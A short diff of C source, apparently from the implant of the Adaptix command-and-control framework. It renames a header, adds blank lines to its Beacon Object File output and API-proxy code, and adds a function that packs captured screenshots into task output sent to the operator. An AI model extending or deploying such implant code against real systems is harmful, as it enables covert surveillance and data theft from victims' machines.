@@ -1,4 +1,4 @@
-#include "beacon.h"
+#include "adaptix.h"
 #include "utils.h"
 #include "ApiLoader.h"
 #include "Packer.h"
@@ -105,6 +105,7 @@ char* BeaconDataExtract(datap* parser, int* size)
 }
 
 
+
 /// Output API
 
 void BeaconOutput(int type, const char* data, int len)
@@ -131,6 +132,7 @@ void BeaconPrintf(int type, const char* fmt, ...)
 
 	MemFreeLocal((LPVOID*)&tmp_output, length);
 }
+
 
 
 /// Format API
@@ -221,6 +223,7 @@ void BeaconFormatInt(formatp* format, int value)
 	format->buffer += 4;
 	return;
 }
+
 
 
 /// Internal APIs
@@ -402,4 +405,17 @@ FARPROC proxy_GetProcAddress(HMODULE hModule, LPCSTR  lpProcName)
 BOOL proxy_FreeLibrary(HMODULE hLibModule)
 {
 	return ApiWin->FreeLibrary(hLibModule);
+}
+
+////////// AX Functions
+
+void AxAddScreenshot(char* note, char* data, int len)
+{
+	if (bofOutputPacker) {
+		bofOutputPacker->Pack32(bofTaskId);
+		bofOutputPacker->Pack32(51);			// COMMAND_EXEC_BOF_OUT
+		bofOutputPacker->Pack32(CALLBACK_AX_SCREENSHOT);
+		bofOutputPacker->PackStringA(note);
+		bofOutputPacker->PackBytes((PBYTE)data, len);
+	}
 }
